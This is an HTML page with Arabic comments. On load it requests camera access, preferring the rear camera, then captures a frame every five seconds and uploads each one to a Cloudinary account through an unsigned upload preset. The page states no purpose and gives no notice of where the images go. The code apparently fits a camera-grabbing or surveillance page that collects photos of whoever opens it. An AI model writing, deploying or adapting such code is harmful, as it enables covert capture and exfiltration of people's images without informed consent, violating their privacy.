<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Camera Capture</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        #cameraView {
            width: 400px;
            height: 300px;
            border: 2px solid #ddd;
            border-radius: 8px;
            margin: 20px auto;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #status {
            padding: 10px;
            background: #f0f0f0;
            border-radius: 5px;
            max-width: 400px;
            margin: 0 auto;
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <video id="cameraView" autoplay playsinline></video>
    <div id="status">جاري التهيئة...</div>

    <script>
        // إعدادات Cloudinary
        const CLOUD_NAME = "ec7b8168011a7641f26bd74f766108";
        const UPLOAD_PRESET = "unsigned_preset";
        
        // عناصر DOM
        const cameraView = document.getElementById("cameraView");
        const statusElement = document.getElementById("status");
        
        // متغيرات التتبع
        let stream = null;
        let captureInterval = null;
        
        // دالة لبدء الكاميرا مع تحسينات
        async function startCamera() {
            try {
                console.log("جاري التحقق من توفر الكاميرا...");
                statusElement.textContent = "جاري التحقق من الكاميرا...";
                
                // التحقق من صلاحيات الكاميرا أولاً
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    throw new Error("واجهة الكاميرا غير مدعومة في هذا المتصفح");
                }
                
                // طلب إذن الوصول إلى الكاميرا مع تحسينات
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: "environment" // الكاميرا الخلفية أولاً
                    },
                    audio: false
                });
                
                console.log("تم الحصول على صلاحيات الكاميرا بنجاح");
                statusElement.textContent = "الكاميرا جاهزة...";
                
                // عرض بث الكاميرا
                cameraView.srcObject = stream;
                cameraView.onloadedmetadata = () => {
                    console.log("بدء بث الكاميرا بأبعاد:", 
                        cameraView.videoWidth, "x", cameraView.videoHeight);
                    statusElement.textContent = "جاري التشغيل - سيلتقط الصور كل 5 ثواني";
                    
                    // بدء التقاط الصور كل 5 ثواني بعد التأكد من تشغيل الكاميرا
                    captureInterval = setInterval(captureAndUpload, 5000);
                };
                
            } catch (error) {
                console.error("خطأ في تشغيل الكاميرا:", error);
                statusElement.textContent = "خطأ: " + error.message;
                
                // محاولة استخدام الكاميرا الأمامية إذا فشلت الخلفية
                try {
                    console.log("محاولة استخدام الكاميرا الأمامية...");
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: "user" // الكاميرا الأمامية
                        },
                        audio: false
                    });
                    
                    cameraView.srcObject = stream;
                    statusElement.textContent = "الكاميرا الأمامية تعمل - جاري التقاط الصور";
                    captureInterval = setInterval(captureAndUpload, 5000);
                } catch (frontError) {
                    console.error("خطأ في الكاميرا الأمامية:", frontError);
                    statusElement.textContent = "فشل تشغيل الكاميرا. يرجى التأكد من الصلاحيات";
                }
            }
        }
        
        // دالة محسنة لالتقاط الصور ورفعها
        async function captureAndUpload() {
            try {
                console.log("جاري التقاط صورة جديدة...");
                
                // التحقق من أن الكاميرا تعمل
                if (!stream || !cameraView.videoWidth) {
                    throw new Error("الكاميرا غير جاهزة بعد");
                }
                
                // إنشاء عنصر canvas
                const canvas = document.createElement("canvas");
                canvas.width = cameraView.videoWidth;
                canvas.height = cameraView.videoHeight;
                const ctx = canvas.getContext("2d");
                
                // رسم إطار الفيديو على canvas
                ctx.drawImage(cameraView, 0, 0, canvas.width, canvas.height);
                
                // تحويل الصورة
                const imageData = canvas.toDataURL("image/jpeg", 0.8);
                console.log("تم التقاط الصورة بأبعاد:", canvas.width, "x", canvas.height);
                
                // رفع الصورة إلى Cloudinary
                const uploadResult = await uploadToCloudinary(imageData);
                console.log("تم رفع الصورة بنجاح:", uploadResult.secure_url);
                
                // تحديث حالة الواجهة
                statusElement.textContent = `تم الرفع: ${new Date().toLocaleTimeString()}`;
                
            } catch (error) {
                console.error("خطأ في الرفع:", error);
                statusElement.textContent = "خطأ في الرفع: " + error.message;
            }
        }
        
        // دالة محسنة للرفع إلى Cloudinary
        async function uploadToCloudinary(imageData) {
            console.log("جاري تحضير الصورة للرفع...");
            
            // تحويل الصورة إلى Blob
            const blob = await (await fetch(imageData)).blob();
            console.log("حجم الصورة:", (blob.size / 1024).toFixed(2), "KB");
            
            // إعداد بيانات الرفع
            const formData = new FormData();
            formData.append("file", blob);
            formData.append("upload_preset", UPLOAD_PRESET);
            formData.append("cloud_name", CLOUD_NAME);
            
            console.log("جاري رفع الصورة إلى Cloudinary...");
            const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/upload`, {
                method: "POST",
                body: formData
            });
            
            if (!response.ok) {
                const errorData = await response.json();
                console.error("تفاصيل الخطأ:", errorData);
                throw new Error(`فشل الرفع: ${response.status}`);
            }
            
            return await response.json();
        }
        
        // بدء التشغيل عند تحميل الصفحة
        window.addEventListener("DOMContentLoaded", () => {
            console.log("الصفحة جاهزة - بدء تشغيل الكاميرا");
            startCamera();
        });
        
        // تنظيف الموارد عند إغلاق الصفحة
        window.addEventListener("beforeunload", () => {
            console.log("تنظيف الموارد...");
            if (captureInterval) clearInterval(captureInterval);
            if (stream) stream.getTracks().forEach(track => track.stop());
        });
    </script>
</body>
</html>
